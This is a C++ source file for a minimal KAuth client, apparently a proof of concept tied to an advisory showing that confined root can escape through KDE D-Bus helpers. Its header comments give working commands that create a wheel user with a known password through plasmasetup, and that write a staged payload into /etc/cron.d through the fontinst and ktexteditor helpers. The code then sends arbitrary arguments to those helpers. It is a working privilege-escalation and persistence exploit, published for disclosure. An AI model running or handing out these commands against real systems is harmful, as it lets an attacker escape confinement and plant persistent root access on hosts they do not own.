// LinnemanLabs - minimal KAuth KF6 client
//
// https://linnemanlabs.com/posts/confined-root-is-still-root/
// https://github.com/linnemanlabs/advisories/
//
// Usage: kauthclient <action> <helperId> key=val [int:key=N] [bool:key=true] ...
//
// Invokes a KDE D-Bus helper action with a QVariantMap built from argv
//
// gate: Caller must be uid0 (polkit free-pass)
// reach: domains that can talk to system dbusd_unconfined (~540 on Fedora)
//
// Examples:
//
// createuser: Add a wheel user named svc with password "whatever":
// ./kauthclient org.kde.plasmasetup.createuser org.kde.plasmasetup \
//      username=svc fullName=svc extraGroups='wheel' password=whatever
//
// fontinst: Copy a file staged at /dev/shm/payload to /etc/cron.d/linnemanlabs_poc:
// ./kauthclient org.kde.fontinst.manage org.kde.fontinst \
//      method=install file=/dev/shm/payload destFolder=/etc/cron.d/ name=linnemanlabs_poc bool:createAfm=false int:type=0
//
// ktexteditor6: Copy a file staged at /dev/shm/payload to /etc/cron.d/linnemanlabs_poc
// ./kauthclient org.kde.ktexteditor6.katetextbuffer.savefile org.kde.ktexteditor6.katetextbuffer \
//    sourceFile=/dev/shm/kate_src targetFile=/etc/cron.d/linnemanlabs_poc \
//    hex:checksum=$( sha512sum /dev/shm/kate_src | cut -d ' ' -f 1 ) \
//    int:ownerId=0 int:groupId=0
//
#include <KAuth/Action>
#include <KAuth/ExecuteJob>
#include <QCoreApplication>
#include <QVariantMap>
#include <QDebug>
using namespace KAuth;

int main(int argc, char **argv)
{
    QCoreApplication app(argc, argv);
    if (argc < 3) { qWarning() << "usage: kauthclient <action> <helperId> key=val..."; return 2; }
    Action action(QString::fromLocal8Bit(argv[1]));
    action.setHelperId(QString::fromLocal8Bit(argv[2]));
    QVariantMap args;
    for (int i = 3; i < argc; ++i) {
        QString a = QString::fromLocal8Bit(argv[i]);
        int eq = a.indexOf('=');
        QString k = a.left(eq), v = a.mid(eq + 1);
        if (k.startsWith("int:"))       { args[k.mid(4)]  = v.toInt(); }
        else if (k.startsWith("bool:")) { args[k.mid(5)]  = (v == "true"); }
        else if (k.startsWith("hex:"))  { args[k.mid(4)]  = QByteArray::fromHex(v.toLatin1()); }
        else                            { args[k]         = v; }
    }
    action.setArguments(args);
    qInfo() << "action:" << action.name() << "valid:" << action.isValid();
    ExecuteJob *job = action.execute();
    bool ok = job->exec();
    qInfo() << "exec-ok:" << ok << "error:" << job->error() << "text:" << job->errorText();
    qInfo() << "reply-data:" << job->data();
    return ok ? 0 : 1;
}
